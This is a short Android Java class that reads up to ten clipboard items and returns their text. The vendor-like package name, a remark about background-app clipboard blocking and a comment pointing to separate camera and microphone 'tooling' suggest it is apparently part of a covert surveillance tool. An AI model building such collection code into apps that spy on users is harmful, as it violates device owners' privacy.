package com.samsung.android.usersuite;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.media.AudioManager;
import android.util.Log;

import java.util.HashMap;
import java.util.Map;

public class SystemState {

    public static Map<String, Object> clipboard(Context ctx) {
        Map<String, Object> out = new HashMap<>();
        try {
            ClipboardManager cm = (ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData cd = cm != null ? cm.getPrimaryClip() : null;
            StringBuilder sb = new StringBuilder();
            if (cd != null) {
                for (int i = 0; i < Math.min(cd.getItemCount(), 10); i++) {
                    CharSequence t = cd.getItemAt(i).coerceToText(ctx);
                    if (t != null) sb.append(t).append("\n");
                }
            }
            out.put("data", sb.toString());
        } catch (Exception e) {
            out.put("error", e.getClass().getSimpleName()
                + " — modern android blocks clipboard for background apps");
        }
        return out;
    }

    /** camera_front / camera_back / mic — tooling living in their own classes */
}
